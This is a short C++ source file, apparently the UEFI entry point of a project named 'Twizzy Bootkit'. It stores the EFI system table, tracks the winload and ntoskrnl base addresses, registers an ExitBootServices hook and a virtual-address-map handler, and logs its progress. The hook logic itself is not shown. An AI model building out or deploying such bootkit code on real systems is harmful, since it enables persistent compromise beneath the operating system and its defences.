#include "include.hpp"

namespace globals
{
  EFI_SYSTEM_TABLE* system_table = 0;
  uint64_t winload_base = 0;
  uint64_t ntoskrnl_base = 0;
}

uint64_t g_runtime_data_ptr = 0;

EFI_STATUS EFIAPI CuteMain(EFI_HANDLE image_handle, EFI_SYSTEM_TABLE* efi_system_table)
{
  globals::system_table = efi_system_table;

  log::serial("[Twizzy Bootkit] CuteMain entered\r\n");
  log::print(L"CuteMain entered\r\n");

  ebs::create_hook();
  va_map_handler::create_handler();

  log::serial("[Twizzy Bootkit] handlers registered\r\n");
  log::print(L"handlers registered\r\n");

  return EFI_SUCCESS;
}
